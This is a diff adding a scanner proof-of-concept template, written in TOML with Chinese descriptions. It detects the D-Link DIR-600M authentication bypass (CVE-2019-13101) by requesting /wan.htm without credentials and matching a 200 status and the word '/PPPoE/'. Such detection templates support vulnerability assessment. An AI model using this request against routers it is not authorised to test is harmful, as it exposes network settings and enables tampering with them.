@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过直接访问 /wan.htm 页面检测 D-Link DIR-600M 路由器是否存在认证绕过漏洞。未授权访问该页面可获取 WAN 口配置信息（IP/DNS/MAC）并篡改数据字段。"
+id = "POC-AVE-2019-0063"
+name = "D-Link DIR-600M 认证绕过 PoC"
+severity = "critical"
+tags = ["ave-2019-0063"]
+vuln_id = [
+    "CVE-2019-13101",
+    "AVE-2019-0063",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wan.htm"
+protocol = "http"
+
+[poc.requests.headers]
+Origin = "{{BaseURL}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["/PPPoE/"]
